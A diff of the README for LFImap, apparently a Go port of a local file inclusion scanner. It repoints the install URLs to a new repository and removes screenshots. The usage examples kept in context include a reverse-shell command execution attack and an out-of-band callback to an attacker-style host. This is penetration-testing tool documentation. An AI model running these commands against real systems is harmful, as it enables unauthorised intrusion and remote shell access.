@@ -42,7 +42,7 @@ Inspired by [SQLmap](https://github.com/sqlmapproject/sqlmap).
 ### From source (requires Go 1.21+)
 
 ```bash
-git clone https://github.com/hansmach1ne/lfimap.git
+git clone https://github.com/szybnev/LFImap-go.git
 cd lfimap
 go build ./cmd/lfimap
 ./lfimap --help
@@ -51,12 +51,12 @@ go build ./cmd/lfimap
 ### Install globally
 
 ```bash
-go install github.com/hansmach1ne/lfimap/cmd/lfimap@latest
+go install github.com/szybnev/LFImap-go/cmd/lfimap@latest
 ```
 
 ## Usage
 
-```
+```bash
 lfimap [flags]
 
 TARGET OPTIONS:
@@ -125,32 +125,20 @@ OUTPUT OPTIONS:
 lfimap -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a
 ```
 
-![LFImap_A](https://github.com/hansmach1ne/LFImap/assets/57464251/7692235a-dfcd-4cab-b0bd-aefdd873cae6)
-
 #### 2) Post argument testing with '-D'
 ```bash
 lfimap -U "http://IP/index.php" -D "page=PWN" -a
 ```
-
-![LFIMAP_POST](https://github.com/hansmach1ne/LFImap/assets/57464251/ebd6b1a4-8990-4a36-b321-871fe9271313)
-
 
 #### 3) Reverse shell remote command execution attack with '-x'
 ```bash
 lfimap -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a -x --lhost <IP> --lport <PORT>
 ```
 
-![LFIMAP_revshell](https://github.com/hansmach1ne/LFImap/assets/57464251/5d64244c-8a37-4019-bf2f-8fa7eb6bfd69)
-
-
-
 #### 4) Out-of-Band blind vulnerability verbose testing support with '--callback'
 ```bash
 lfimap -U "http://IP/index.php?param=PWN" -a -v --callback="attacker.oastify.com"
 ```
-
-![LFIMAP_OOB](https://github.com/hansmach1ne/LFImap/assets/57464251/d49d3a80-1c34-49fd-97d8-eb870dae040d)
-
 
 If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it, as soon as I can.
 Pull requests are welcome.
